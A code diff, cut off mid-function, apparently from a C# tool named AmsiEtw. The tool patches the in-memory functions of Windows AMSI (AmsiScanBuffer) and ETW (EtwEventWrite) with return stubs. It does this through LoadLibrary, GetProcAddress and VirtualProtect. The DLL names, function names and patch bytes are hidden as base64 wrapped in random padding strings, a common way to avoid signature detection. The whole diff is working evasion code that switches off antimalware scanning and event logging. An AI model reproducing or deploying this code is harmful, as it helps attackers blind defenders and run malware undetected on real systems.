@@ -1,34 +1,58 @@
 ﻿using System;
-
 using System.Runtime.InteropServices;
 using System.Text;
 
 namespace AmsiEtw
 {
-    public class Program
+    public class ByPass
     {
+        [DllImport("kernel32")]
+        static extern IntPtr GetProcAddress(
+            IntPtr hModule,
+            string procName);
+
+        [DllImport("kernel32")]
+        static extern IntPtr LoadLibrary(
+            string name);
+
+        [DllImport("kernel32")]
+        static extern bool VirtualProtect(
+            IntPtr lpAddress,
+            UIntPtr dwSize,
+            uint flNewProtect,
+            out uint lpflOldProtect);
         public static void Main()
         {
-            if (Is64Bit())
-            {
-                PatchMemory(DecodeBase64(Split.NameDllAmsi()), DecodeBase64(Split.FonctionAmsi()),
-                    Convert.FromBase64String(Split.X64PatchAmsi()));
-                PatchMemory(DecodeBase64(Split.NameDllEtw()), DecodeBase64(Split.FonctionEtw()),
-                    Convert.FromBase64String(Split.X64PatchEtw()));
-            }
-
-            PatchMemory(DecodeBase64(Split.NameDllAmsi()), DecodeBase64(Split.FonctionAmsi()),
-                Convert.FromBase64String(Split.X86PatchAmsi()));
-            PatchMemory(DecodeBase64(Split.NameDllEtw()), DecodeBase64(Split.FonctionEtw()),
-                Convert.FromBase64String(Split.X86PatchEtw()));
+            CheckOs(true);
         }
 
-        private static void PatchMemory(string nameDll, string nameFonction, byte[] patch)
+        protected static void CheckOs(bool security)
         {
-            IntPtr library = Win32.DelegateLoadLibrary(ref nameDll);
-            IntPtr procAddress = Win32.DelegateGetProc(library, ref nameFonction);
+            if (security)
+            {
+                if (Is64Bit())
+                {
+                    PatchMemory(DecodeBase64Str(ObfStr.NameDllAmsi()), DecodeBase64Str(ObfStr.FonctionDllAmsi()),
+                        DecodeBase64Bytes(ObfStr.X64PatchDllAmsi()));
+                    PatchMemory(DecodeBase64Str(ObfStr.NameDllEtw()), DecodeBase64Str(ObfStr.FonctionDllEtw()),
+                        DecodeBase64Bytes(ObfStr.X64PatchDllEtw()));
+                }
+                else if (!Is64Bit())
+                {
+                    PatchMemory(DecodeBase64Str(ObfStr.NameDllAmsi()), DecodeBase64Str(ObfStr.FonctionDllAmsi()),
+                        DecodeBase64Bytes(ObfStr.X86PatchDllAmsi()));
+                    PatchMemory(DecodeBase64Str(ObfStr.NameDllEtw()), DecodeBase64Str(ObfStr.FonctionDllEtw()),
+                        DecodeBase64Bytes(ObfStr.X86PatchDllEtw()));
+                }
+            }
+        }
+
+        protected static void PatchMemory(string nameDll, string nameFonction, byte[] patch)
+        {
+            IntPtr library = LoadLibrary(nameDll);
+            IntPtr procAddress = GetProcAddress(library, nameFonction);
             uint output;
-            Win32.VirtualAllocEx(procAddress, (IntPtr)patch.Length, 0x40, out output);
+            VirtualProtect(procAddress, (UIntPtr)patch.Length, 0x40, out output);
             Marshal.Copy(patch, 0, procAddress, patch.Length);
         }
 
@@ -42,288 +66,142 @@ namespace AmsiEtw
             return false;
         }
 
-        protected static String DecodeBase64(string input)
+        protected static string DecodeBase64Str(string input)
         {
             return Encoding.ASCII.GetString(Convert.FromBase64String(input));
         }
-    }
 
-    internal class Win32
-    {
-        [DllImport("kernel32", SetLastError = true)]
-        public static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string name);
-
-        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
-        public static extern IntPtr GetProcAddress(IntPtr hProcess,
-            [MarshalAs(UnmanagedType.VBByRefStr)] ref string name);
-
-        private static TCreateApi LoadApi<TCreateApi>(string name, string method)
+        protected static byte[] DecodeBase64Bytes(string input)
         {
-            var input = (TCreateApi)((object)Marshal.GetDelegateForFunctionPointer(
-                GetProcAddress(LoadLibraryA(ref name), ref method), typeof(TCreateApi)));
-            return input;
+            return Convert.FromBase64String(input);
         }
-
-        //VirtualProtect
-        public static readonly DelegateVirtualProtect VirtualAllocEx = LoadApi<DelegateVirtualProtect>("kernel32",
-            Encoding.Default.GetString(Convert.FromBase64String(Split.VirtualProtect())));
-
-        public delegate int DelegateVirtualProtect(IntPtr lpAddress, IntPtr dwSize, int flNewProtect,
-            out uint lpflOldProtect);
-
-        //LoadLibraryA
-        public static readonly DelegateLoadLibraryA DelegateLoadLibrary = LoadApi<DelegateLoadLibraryA>("kernel32",
-            Encoding.Default.GetString(Convert.FromBase64String(Split.LoadLibraryA())));
-
-        public delegate IntPtr DelegateLoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string name);
-
-        //GetProcAddress
-        public static readonly DelegateGetProcAddress DelegateGetProc = LoadApi<DelegateGetProcAddress>("kernel32",
-            Encoding.Default.GetString(Convert.FromBase64String(Split.GetProcessAdress())));
-
-        public delegate IntPtr DelegateGetProcAddress(IntPtr hProcess,
-            [MarshalAs(UnmanagedType.VBByRefStr)] ref string name);
     }
 
-    static class Split
+    static class ObfStr
     {
         public static string NameDllEtw()
         {
             string input = "";
-            input +=
-                "Jzn7CdcQHi0PETWReCfRoneIbuF0abdEarr5NDMjtWt4Cfd2u5bnRkJzn7CdcQHi0PETWReCfRoneIbuF0abdEarr5NDMjtWt4Cfd2u5"
-                    .Replace("Jzn7CdcQHi0PETWReCfRoneIbuF0abdEarr5NDMjtWt4Cfd2u5", "");
-            input +=
-                "Jzn7CdcQHi0PETWReCfRoneIbuF0abdEarr5NDMjtWt4Cfd2u5bGwuJzn7CdcQHi0PETWReCfRoneIbuF0abdEarr5NDMjtWt4Cfd2u5"
-                    .Replace("Jzn7CdcQHi0PETWReCfRoneIbuF0abdEarr5NDMjtWt4Cfd2u5", "");
-            input +=
-                "Jzn7CdcQHi0PETWReCfRoneIbuF0abdEarr5NDMjtWt4Cfd2u5ZGxsJzn7CdcQHi0PETWReCfRoneIbuF0abdEarr5NDMjtWt4Cfd2u5"
-                    .Replace("Jzn7CdcQHi0PETWReCfRoneIbuF0abdEarr5NDMjtWt4Cfd2u5", "");
-
+            input += "DXaCGMesMglq8en8rjAxdoorJWcWbnRkbGwuZGDXaCGMesMglq8en8rjAxdoorJWcW".Replace(
+                "DXaCGMesMglq8en8rjAxdoorJWcW", "");
+            input += "DXaCGMesMglq8en8rjAxdoorJWcWxsDXaCGMesMglq8en8rjAxdoorJWcW".Replace(
+                "DXaCGMesMglq8en8rjAxdoorJWcW", "");
             return input;
         }
 
-        public static string FonctionEtw()
+        public static string FonctionDllEtw()
         {
             string input = "";
             input +=
-                "SC1bATOW2ULzu8a5lmA2vw85wjc3mytI32kbqqj3hgT8SGXzIssPsoxgE6ob0VuElD62Y8P5CGUOc9mqMnu3FeZOERXR3SC1bATOW2ULzu8a5lmA2vw85wjc3mytI32kbqqj3hgT8SGXzIssPsoxgE6ob0VuElD62Y8P5CGUOc9mqMnu3FeZOE"
+                "zRSlYqrCZlZLUS4abwHzFquUXeLZFOBr6TAgpE7VLU9EI9CydGmSO2AJh7O3eR7KjsPARXuWzvovrpLXcX69mtdET19r0D13XyeauBgFVQdcNPc2w0bGU8i0OKraYDgv4vY2Kvna11nWPA1EZG59muiYQoLjTGqStrhc0jrANAPdUMkOTnARHhJKM9lgjDGvKVmicZNzZ4vlfFEED7PqFZKMiXRXR3RXZlbnzRSlYqrCZlZLUS4abwHzFquUXeLZFOBr6TAgpE7VLU9EI9CydGmSO2AJh7O3eR7KjsPARXuWzvovrpLXcX69mtdET19r0D13XyeauBgFVQdcNPc2w0bGU8i0OKraYDgv4vY2Kvna11nWPA1EZG59muiYQoLjTGqStrhc0jrANAPdUMkOTnARHhJKM9lgjDGvKVmicZNzZ4vlfFEED7PqFZKMiX"
                     .Replace(
-                        "SC1bATOW2ULzu8a5lmA2vw85wjc3mytI32kbqqj3hgT8SGXzIssPsoxgE6ob0VuElD62Y8P5CGUOc9mqMnu3FeZOE",
+                        "zRSlYqrCZlZLUS4abwHzFquUXeLZFOBr6TAgpE7VLU9EI9CydGmSO2AJh7O3eR7KjsPARXuWzvovrpLXcX69mtdET19r0D13XyeauBgFVQdcNPc2w0bGU8i0OKraYDgv4vY2Kvna11nWPA1EZG59muiYQoLjTGqStrhc0jrANAPdUMkOTnARHhJKM9lgjDGvKVmicZNzZ4vlfFEED7PqFZKMiX",
                         "");
             input +=
-                "SC1bATOW2ULzu8a5lmA2vw85wjc3mytI32kbqqj3hgT8SGXzIssPsoxgE6ob0VuElD62Y8P5CGUOc9mqMnu3FeZOERXZlSC1bATOW2ULzu8a5lmA2vw85wjc3mytI32kbqqj3hgT8SGXzIssPsoxgE6ob0VuElD62Y8P5CGUOc9mqMnu3FeZOE"
+                "zRSlYqrCZlZLUS4abwHzFquUXeLZFOBr6TAgpE7VLU9EI9CydGmSO2AJh7O3eR7KjsPARXuWzvovrpLXcX69mtdET19r0D13XyeauBgFVQdcNPc2w0bGU8i0OKraYDgv4vY2Kvna11nWPA1EZG59muiYQoLjTGqStrhc0jrANAPdUMkOTnARHhJKM9lgjDGvKVmicZNzZ4vlfFEED7PqFZKMiXRXcml0ZQ==zRSlYqrCZlZLUS4abwHzFquUXeLZFOBr6TAgpE7VLU9EI9CydGmSO2AJh7O3eR7KjsPARXuWzvovrpLXcX69mtdET19r0D13XyeauBgFVQdcNPc2w0bGU8i0OKraYDgv4vY2Kvna11nWPA1EZG59muiYQoLjTGqStrhc0jrANAPdUMkOTnARHhJKM9lgjDGvKVmicZNzZ4vlfFEED7PqFZKMiX"
                     .Replace(
-                        "SC1bATOW2ULzu8a5lmA2vw85wjc3mytI32kbqqj3hgT8SGXzIssPsoxgE6ob0VuElD62Y8P5CGUOc9mqMnu3FeZOE",
-                        "");
-            input +=
-                "SC1bATOW2ULzu8a5lmA2vw85wjc3mytI32kbqqj3hgT8SGXzIssPsoxgE6ob0VuElD62Y8P5CGUOc9mqMnu3FeZOEbnRXSC1bATOW2ULzu8a5lmA2vw85wjc3mytI32kbqqj3hgT8SGXzIssPsoxgE6ob0VuElD62Y8P5CGUOc9mqMnu3FeZOE"
-                    .Replace(
-                        "SC1bATOW2ULzu8a5lmA2vw85wjc3mytI32kbqqj3hgT8SGXzIssPsoxgE6ob0VuElD62Y8P5CGUOc9mqMnu3FeZOE",
-                        "");
-            input +=
-                "SC1bATOW2ULzu8a5lmA2vw85wjc3mytI32kbqqj3hgT8SGXzIssPsoxgE6ob0VuElD62Y8P5CGUOc9mqMnu3FeZOEcml0SC1bATOW2ULzu8a5lmA2vw85wjc3mytI32kbqqj3hgT8SGXzIssPsoxgE6ob0VuElD62Y8P5CGUOc9mqMnu3FeZOE"
-                    .Replace(
-                        "SC1bATOW2ULzu8a5lmA2vw85wjc3mytI32kbqqj3hgT8SGXzIssPsoxgE6ob0VuElD62Y8P5CGUOc9mqMnu3FeZOE",
-                        "");
-            input +=
-                "SC1bATOW2ULzu8a5lmA2vw85wjc3mytI32kbqqj3hgT8SGXzIssPsoxgE6ob0VuElD62Y8P5CGUOc9mqMnu3FeZOEZQ==SC1bATOW2ULzu8a5lmA2vw85wjc3mytI32kbqqj3hgT8SGXzIssPsoxgE6ob0VuElD62Y8P5CGUOc9mqMnu3FeZOE"
-                    .Replace(
-                        "SC1bATOW2ULzu8a5lmA2vw85wjc3mytI32kbqqj3hgT8SGXzIssPsoxgE6ob0VuElD62Y8P5CGUOc9mqMnu3FeZOE",
+                        "zRSlYqrCZlZLUS4abwHzFquUXeLZFOBr6TAgpE7VLU9EI9CydGmSO2AJh7O3eR7KjsPARXuWzvovrpLXcX69mtdET19r0D13XyeauBgFVQdcNPc2w0bGU8i0OKraYDgv4vY2Kvna11nWPA1EZG59muiYQoLjTGqStrhc0jrANAPdUMkOTnARHhJKM9lgjDGvKVmicZNzZ4vlfFEED7PqFZKMiX",
                         "");
 
             return input;
         }
 
-        public static string X64PatchEtw()
+        public static string X64PatchDllEtw()
         {
             string input = "";
-            input +=
-                "3WYs6UbDzmqrV5UPlku2s4KZArSl5zoAsmimTIYNqoCXfDAxLTriQAv9M8sPB0HA7q8sXr5dMgLD1w46reZlHGts1jaUaJLzgCZzFRaeXOWtzrHZEvhgbg216P1xRlCCUVhzXF1ZE4N2tA3JcBQoloY9Ki2zamNwLUYdKSC93IcgT9I6WrVPVYaq6hpzMC9braqZlZ9J8QudM1qKa6ctQ7bx3sgnnNx1IBz2SsU6SDPA3WYs6UbDzmqrV5UPlku2s4KZArSl5zoAsmimTIYNqoCXfDAxLTriQAv9M8sPB0HA7q8sXr5dMgLD1w46reZlHGts1jaUaJLzgCZzFRaeXOWtzrHZEvhgbg216P1xRlCCUVhzXF1ZE4N2tA3JcBQoloY9Ki2zamNwLUYdKSC93IcgT9I6WrVPVYaq6hpzMC9braqZlZ9J8QudM1qKa6ctQ7bx3sgnnNx1IBz2SsU6"
-                    .Replace(
-                        "3WYs6UbDzmqrV5UPlku2s4KZArSl5zoAsmimTIYNqoCXfDAxLTriQAv9M8sPB0HA7q8sXr5dMgLD1w46reZlHGts1jaUaJLzgCZzFRaeXOWtzrHZEvhgbg216P1xRlCCUVhzXF1ZE4N2tA3JcBQoloY9Ki2zamNwLUYdKSC93IcgT9I6WrVPVYaq6hpzMC9braqZlZ9J8QudM1qKa6ctQ7bx3sgnnNx1IBz2SsU6",
-                        "");
-            input +=
-                "3WYs6UbDzmqrV5UPlku2s4KZArSl5zoAsmimTIYNqoCXfDAxLTriQAv9M8sPB0HA7q8sXr5dMgLD1w46reZlHGts1jaUaJLzgCZzFRaeXOWtzrHZEvhgbg216P1xRlCCUVhzXF1ZE4N2tA3JcBQoloY9Ki2zamNwLUYdKSC93IcgT9I6WrVPVYaq6hpzMC9braqZlZ9J8QudM1qKa6ctQ7bx3sgnnNx1IBz2SsU6ww==3WYs6UbDzmqrV5UPlku2s4KZArSl5zoAsmimTIYNqoCXfDAxLTriQAv9M8sPB0HA7q8sXr5dMgLD1w46reZlHGts1jaUaJLzgCZzFRaeXOWtzrHZEvhgbg216P1xRlCCUVhzXF1ZE4N2tA3JcBQoloY9Ki2zamNwLUYdKSC93IcgT9I6WrVPVYaq6hpzMC9braqZlZ9J8QudM1qKa6ctQ7bx3sgnnNx1IBz2SsU6"
-                    .Replace(
-                        "3WYs6UbDzmqrV5UPlku2s4KZArSl5zoAsmimTIYNqoCXfDAxLTriQAv9M8sPB0HA7q8sXr5dMgLD1w46reZlHGts1jaUaJLzgCZzFRaeXOWtzrHZEvhgbg216P1xRlCCUVhzXF1ZE4N2tA3JcBQoloY9Ki2zamNwLUYdKSC93IcgT9I6WrVPVYaq6hpzMC9braqZlZ9J8QudM1qKa6ctQ7bx3sgnnNx1IBz2SsU6",
-                        "");
-
+            input += "FAen5bPhXIVkrM1tDT4CzXkHhxYZ21BLD4SDPAww==FAen5bPhXIVkrM1tDT4CzXkHhxYZ21BLD4".Replace(
+                "FAen5bPhXIVkrM1tDT4CzXkHhxYZ21BLD4", "");
             return input;
         }
 
-        public static string X86PatchEtw()
+        public static string X86PatchDllEtw()
         {
             string input = "";
             input +=
-                "5gUwWwiFyfxs7ZwkaEt0gCd2c2EhUyX8jXyiwwH4Y19kIysYEG1yIWR3DbTdrAuAHyIklOxo6zcpC2toJpdN6j0MF4eUcnMYG8cTpHxzSN2T4m1KrpUChgEi86fqtcMSnDiEZa8B1n4trhScDUnxTK0j44VtmHGzAjq1DxuRqTK3mV1boCmZzZ9cM8JfEPZuhFsH1bYQjVGA967jD3FjeqAljNoFnOMb4ZWgmtkNnWzeS9cPBM8DC5gUwWwiFyfxs7ZwkaEt0gCd2c2EhUyX8jXyiwwH4Y19kIysYEG1yIWR3DbTdrAuAHyIklOxo6zcpC2toJpdN6j0MF4eUcnMYG8cTpHxzSN2T4m1KrpUChgEi86fqtcMSnDiEZa8B1n4trhScDUnxTK0j44VtmHGzAjq1DxuRqTK3mV1boCmZzZ9cM8JfEPZuhFsH1bYQjVGA967jD3FjeqAljNoFnOMb4ZWgmtkNnWzeS9cPB"
+                "r1BNlgQ4sH11oCjiY0sxOlALI8nifGgBjVplqFKaWps7PyaMZupWyGvF0zFm3sYll0SSX81SqRai3C6TiaIvbKMcjku0AhhoQGWYgHzb2WphqNMx3vEdjnKbo0swNARJuvRwqhxakr2EepvWX67PcEFn55uqYCN1Egx45ZHV7o21uG69EWZRDCqM8DCFAA=r1BNlgQ4sH11oCjiY0sxOlALI8nifGgBjVplqFKaWps7PyaMZupWyGvF0zFm3sYll0SSX81SqRai3C6TiaIvbKMcjku0AhhoQGWYgHzb2WphqNMx3vEdjnKbo0swNARJuvRwqhxakr2EepvWX67PcEFn55uqYCN1Egx45ZHV7o21uG69EWZRDCq"
                     .Replace(
-                        "5gUwWwiFyfxs7ZwkaEt0gCd2c2EhUyX8jXyiwwH4Y19kIysYEG1yIWR3DbTdrAuAHyIklOxo6zcpC2toJpdN6j0MF4eUcnMYG8cTpHxzSN2T4m1KrpUChgEi86fqtcMSnDiEZa8B1n4trhScDUnxTK0j44VtmHGzAjq1DxuRqTK3mV1boCmZzZ9cM8JfEPZuhFsH1bYQjVGA967jD3FjeqAljNoFnOMb4ZWgmtkNnWzeS9cPB",
+                        "r1BNlgQ4sH11oCjiY0sxOlALI8nifGgBjVplqFKaWps7PyaMZupWyGvF0zFm3sYll0SSX81SqRai3C6TiaIvbKMcjku0AhhoQGWYgHzb2WphqNMx3vEdjnKbo0swNARJuvRwqhxakr2EepvWX67PcEFn55uqYCN1Egx45ZHV7o21uG69EWZRDCq",
                         "");
-            input +=
-                "5gUwWwiFyfxs7ZwkaEt0gCd2c2EhUyX8jXyiwwH4Y19kIysYEG1yIWR3DbTdrAuAHyIklOxo6zcpC2toJpdN6j0MF4eUcnMYG8cTpHxzSN2T4m1KrpUChgEi86fqtcMSnDiEZa8B1n4trhScDUnxTK0j44VtmHGzAjq1DxuRqTK3mV1boCmZzZ9cM8JfEPZuhFsH1bYQjVGA967jD3FjeqAljNoFnOMb4ZWgmtkNnWzeS9cPBFAA=5gUwWwiFyfxs7ZwkaEt0gCd2c2EhUyX8jXyiwwH4Y19kIysYEG1yIWR3DbTdrAuAHyIklOxo6zcpC2toJpdN6j0MF4eUcnMYG8cTpHxzSN2T4m1KrpUChgEi86fqtcMSnDiEZa8B1n4trhScDUnxTK0j44VtmHGzAjq1DxuRqTK3mV1boCmZzZ9cM8JfEPZuhFsH1bYQjVGA967jD3FjeqAljNoFnOMb4ZWgmtkNnWzeS9cPB"
-                    .Replace(
-                        "5gUwWwiFyfxs7ZwkaEt0gCd2c2EhUyX8jXyiwwH4Y19kIysYEG1yIWR3DbTdrAuAHyIklOxo6zcpC2toJpdN6j0MF4eUcnMYG8cTpHxzSN2T4m1KrpUChgEi86fqtcMSnDiEZa8B1n4trhScDUnxTK0j44VtmHGzAjq1DxuRqTK3mV1boCmZzZ9cM8JfEPZuhFsH1bYQjVGA967jD3FjeqAljNoFnOMb4ZWgmtkNnWzeS9cPB",
-                        "");
-
             return input;
         }
 
         public static string NameDllAmsi()
         {
             string input = "";
-            input += "EoDdOXFxI8IrwV2iq0AyvyCg1880vtcBTYW1zEoDdOXFxI8IrwV2iq0AyvyCg1880vtcBT".Replace(
-                "EoDdOXFxI8IrwV2iq0AyvyCg1880vtcBT", "");
-            input += "EoDdOXFxI8IrwV2iq0AyvyCg1880vtcBTaS5kEoDdOXFxI8IrwV2iq0AyvyCg1880vtcBT".Replace(
-                "EoDdOXFxI8IrwV2iq0AyvyCg1880vtcBT", "");
-            input += "EoDdOXFxI8IrwV2iq0AyvyCg1880vtcBTbGw=EoDdOXFxI8IrwV2iq0AyvyCg1880vtcBT".Replace(
-                "EoDdOXFxI8IrwV2iq0AyvyCg1880vtcBT", "");
-
-            return input;
-        }
-
-        public static string FonctionAmsi()
-        {
-            string input = "";
             input +=
-                "MLxiU9pzIOFC4PTZw3ZHCWyzL3fdRF9XmJZbZqLLS6TcjQH7UXc1Yet0W8XbdMQW1zMLxiU9pzIOFC4PTZw3ZHCWyzL3fdRF9XmJZbZqLLS6TcjQH7UXc1Yet0W8XbdM"
-                    .Replace("MLxiU9pzIOFC4PTZw3ZHCWyzL3fdRF9XmJZbZqLLS6TcjQH7UXc1Yet0W8XbdM", "");
-            input +=
-                "MLxiU9pzIOFC4PTZw3ZHCWyzL3fdRF9XmJZbZqLLS6TcjQH7UXc1Yet0W8XbdMaVNjMLxiU9pzIOFC4PTZw3ZHCWyzL3fdRF9XmJZbZqLLS6TcjQH7UXc1Yet0W8XbdM"
-                    .Replace("MLxiU9pzIOFC4PTZw3ZHCWyzL3fdRF9XmJZbZqLLS6TcjQH7UXc1Yet0W8XbdM", "");
-            input +=
-                "MLxiU9pzIOFC4PTZw3ZHCWyzL3fdRF9XmJZbZqLLS6TcjQH7UXc1Yet0W8XbdMYW5CMLxiU9pzIOFC4PTZw3ZHCWyzL3fdRF9XmJZbZqLLS6TcjQH7UXc1Yet0W8XbdM"
-                    .Replace("MLxiU9pzIOFC4PTZw3ZHCWyzL3fdRF9XmJZbZqLLS6TcjQH7UXc1Yet0W8XbdM", "");
-            input +=
-                "MLxiU9pzIOFC4PTZw3ZHCWyzL3fdRF9XmJZbZqLLS6TcjQH7UXc1Yet0W8XbdMdWZmMLxiU9pzIOFC4PTZw3ZHCWyzL3fdRF9XmJZbZqLLS6TcjQH7UXc1Yet0W8XbdM"
-                    .Replace("MLxiU9pzIOFC4PTZw3ZHCWyzL3fdRF9XmJZbZqLLS6TcjQH7UXc1Yet0W8XbdM", "");
-            input +=
-                "MLxiU9pzIOFC4PTZw3ZHCWyzL3fdRF9XmJZbZqLLS6TcjQH7UXc1Yet0W8XbdMZXI=MLxiU9pzIOFC4PTZw3ZHCWyzL3fdRF9XmJZbZqLLS6TcjQH7UXc1Yet0W8XbdM"
-                    .Replace("MLxiU9pzIOFC4PTZw3ZHCWyzL3fdRF9XmJZbZqLLS6TcjQH7UXc1Yet0W8XbdM", "");
-
-            return input;
-        }
-
-        public static string X64PatchAmsi()
-        {
-            string input = "";
-            input +=
-                "t0mrmxlEUagp3enhnwBpJspJ518OSHZN3tgmeCtKJ5AVULa0Yu2wfSDBLdwvzWwMBTwJ7BDkD0gNrTytaHziPmrlqfaBQ7VwJxUBZQ2XrRtpvzT1oCUrhN7YmLdckBUFfuE39xUJOc183Bz0MjWOnnP505YOxawp7nKBvZ11sLcEW8fkVnQAoFc1eJCDYFWyqLuFcAt0mrmxlEUagp3enhnwBpJspJ518OSHZN3tgmeCtKJ5AVULa0Yu2wfSDBLdwvzWwMBTwJ7BDkD0gNrTytaHziPmrlqfaBQ7VwJxUBZQ2XrRtpvzT1oCUrhN7YmLdckBUFfuE39xUJOc183Bz0MjWOnnP505YOxawp7nKBvZ11sLcEW8fkVnQAoFc1eJCDYFWyqL"
+                "5QaDJWSbK9WK04WFBPKRTVB3CFdgz20YFMxYCJ7WiTkmMDMDanI4uGUkPgBE2vmSJ8EoH8D1Sys9uZr93aFLt5n91MJgI2exrSdN8h5ckRl5XU0zyBLbpaiNUFw4zgtZU5Sc5eAVenlcUslgWTrGrCHQtP23vBnDiLlcCX3UB07CyG2mdQhgzmsRyBtplHkdAi4IGJe9ZXF0FEbnXPZedGN5cUoAoNs3QdCQLugUwiGcg1MtjFYW1zaS5kbG5QaDJWSbK9WK04WFBPKRTVB3CFdgz20YFMxYCJ7WiTkmMDMDanI4uGUkPgBE2vmSJ8EoH8D1Sys9uZr93aFLt5n91MJgI2exrSdN8h5ckRl5XU0zyBLbpaiNUFw4zgtZU5Sc5eAVenlcUslgWTrGrCHQtP23vBnDiLlcCX3UB07CyG2mdQhgzmsRyBtplHkdAi4IGJe9ZXF0FEbnXPZedGN5cUoAoNs3QdCQLugUwiGcg1MtjF"
                     .Replace(
-                        "t0mrmxlEUagp3enhnwBpJspJ518OSHZN3tgmeCtKJ5AVULa0Yu2wfSDBLdwvzWwMBTwJ7BDkD0gNrTytaHziPmrlqfaBQ7VwJxUBZQ2XrRtpvzT1oCUrhN7YmLdckBUFfuE39xUJOc183Bz0MjWOnnP505YOxawp7nKBvZ11sLcEW8fkVnQAoFc1eJCDYFWyqL",
+                        "5QaDJWSbK9WK04WFBPKRTVB3CFdgz20YFMxYCJ7WiTkmMDMDanI4uGUkPgBE2vmSJ8EoH8D1Sys9uZr93aFLt5n91MJgI2exrSdN8h5ckRl5XU0zyBLbpaiNUFw4zgtZU5Sc5eAVenlcUslgWTrGrCHQtP23vBnDiLlcCX3UB07CyG2mdQhgzmsRyBtplHkdAi4IGJe9ZXF0FEbnXPZedGN5cUoAoNs3QdCQLugUwiGcg1MtjF",
                         "");
             input +=
-                "t0mrmxlEUagp3enhnwBpJspJ518OSHZN3tgmeCtKJ5AVULa0Yu2wfSDBLdwvzWwMBTwJ7BDkD0gNrTytaHziPmrlqfaBQ7VwJxUBZQ2XrRtpvzT1oCUrhN7YmLdckBUFfuE39xUJOc183Bz0MjWOnnP505YOxawp7nKBvZ11sLcEW8fkVnQAoFc1eJCDYFWyqLB4DDt0mrmxlEUagp3enhnwBpJspJ518OSHZN3tgmeCtKJ5AVULa0Yu2wfSDBLdwvzWwMBTwJ7BDkD0gNrTytaHziPmrlqfaBQ7VwJxUBZQ2XrRtpvzT1oCUrhN7YmLdckBUFfuE39xUJOc183Bz0MjWOnnP505YOxawp7nKBvZ11sLcEW8fkVnQAoFc1eJCDYFWyqL"
+                "5QaDJWSbK9WK04WFBPKRTVB3CFdgz20YFMxYCJ7WiTkmMDMDanI4uGUkPgBE2vmSJ8EoH8D1Sys9uZr93aFLt5n91MJgI2exrSdN8h5ckRl5XU0zyBLbpaiNUFw4zgtZU5Sc5eAVenlcUslgWTrGrCHQtP23vBnDiLlcCX3UB07CyG2mdQhgzmsRyBtplHkdAi4IGJe9ZXF0FEbnXPZedGN5cUoAoNs3QdCQLugUwiGcg1MtjFw=5QaDJWSbK9WK04WFBPKRTVB3CFdgz20YFMxYCJ7WiTkmMDMDanI4uGUkPgBE2vmSJ8EoH8D1Sys9uZr93aFLt5n91MJgI2exrSdN8h5ckRl5XU0zyBLbpaiNUFw4zgtZU5Sc5eAVenlcUslgWTrGrCHQtP23vBnDiLlcCX3UB07CyG2mdQhgzmsRyBtplHkdAi4IGJe9ZXF0FEbnXPZedGN5cUoAoNs3QdCQLugUwiGcg1MtjF"
                     .Replace(
-                        "t0mrmxlEUagp3enhnwBpJspJ518OSHZN3tgmeCtKJ5AVULa0Yu2wfSDBLdwvzWwMBTwJ7BDkD0gNrTytaHziPmrlqfaBQ7VwJxUBZQ2XrRtpvzT1oCUrhN7YmLdckBUFfuE39xUJOc183Bz0MjWOnnP505YOxawp7nKBvZ11sLcEW8fkVnQAoFc1eJCDYFWyqL",
+                        "5QaDJWSbK9WK04WFBPKRTVB3CFdgz20YFMxYCJ7WiTkmMDMDanI4uGUkPgBE2vmSJ8EoH8D1Sys9uZr93aFLt5n91MJgI2exrSdN8h5ckRl5XU0zyBLbpaiNUFw4zgtZU5Sc5eAVenlcUslgWTrGrCHQtP23vBnDiLlcCX3UB07CyG2mdQhgzmsRyBtplHkdAi4IGJe9ZXF0FEbnXPZedGN5cUoAoNs3QdCQLugUwiGcg1MtjF",
                         "");
 
             return input;
         }
 
-        public static string X86PatchAmsi()
+        public static string FonctionDllAmsi()
         {
             string input = "";
             input +=
-                "rpzSxVH8SXpCnlKRuMGOJCDLplDk81fSINa6kYVTYO9JgcUhhJkvWghplnmLRgAa2W4aKNqW1xz5C3pNRfDzRu5lquU6vJC1OjRKi4WTcO4jqmns8Z4wdKJIaSua3tkrv8qclfoXIuWCzW4DGm8VPPYDZJtQK6ZsnMys5KGdvgotyGSEXqURvPcfjnCuFcArpzSxVH8SXpCnlKRuMGOJCDLplDk81fSINa6kYVTYO9JgcUhhJkvWghplnmLRgAa2W4aKNqW1xz5C3pNRfDzRu5lquU6vJC1OjRKi4WTcO4jqmns8Z4wdKJIaSua3tkrv8qclfoXIuWCzW4DGm8VPPYDZJtQK6ZsnMys5KGdvgotyGSEXqURvPcfjnC"
+                "foP1sRHP6GwZ56ha1DNmrX5pz38ibJKXqVHACxoLoLuCEeWa1B7rdzoItjCyTjyx6ZtjzgXDZC7fn3kUghqZLc31r8Rcu02FX7FpvwlUn3Sb1Jfz8sSv2Yldf120P5TjJ2Hqx5it6WvRQW1zaVNjYWfoP1sRHP6GwZ56ha1DNmrX5pz38ibJKXqVHACxoLoLuCEeWa1B7rdzoItjCyTjyx6ZtjzgXDZC7fn3kUghqZLc31r8Rcu02FX7FpvwlUn3Sb1Jfz8sSv2Yldf120P5TjJ2Hqx5it6WvR"
                     .Replace(
-                        "rpzSxVH8SXpCnlKRuMGOJCDLplDk81fSINa6kYVTYO9JgcUhhJkvWghplnmLRgAa2W4aKNqW1xz5C3pNRfDzRu5lquU6vJC1OjRKi4WTcO4jqmns8Z4wdKJIaSua3tkrv8qclfoXIuWCzW4DGm8VPPYDZJtQK6ZsnMys5KGdvgotyGSEXqURvPcfjnC",
+                        "foP1sRHP6GwZ56ha1DNmrX5pz38ibJKXqVHACxoLoLuCEeWa1B7rdzoItjCyTjyx6ZtjzgXDZC7fn3kUghqZLc31r8Rcu02FX7FpvwlUn3Sb1Jfz8sSv2Yldf120P5TjJ2Hqx5it6WvR",
                         "");
             input +=
